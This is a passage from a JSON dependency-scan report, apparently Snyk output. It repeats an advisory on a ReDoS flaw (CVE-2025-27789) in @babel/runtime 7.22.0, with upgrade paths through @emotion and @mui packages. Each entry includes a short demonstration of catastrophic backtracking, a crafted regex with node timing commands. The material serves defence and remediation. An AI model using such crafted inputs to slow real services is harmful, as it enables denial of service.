        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/lab@5.0.0-alpha.131",
          "@mui/base@5.0.0-beta.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "package.json@0.1.0",
          "@mui/material@5.13.2",
          "@mui/base@5.0.0-beta.2",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.16.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
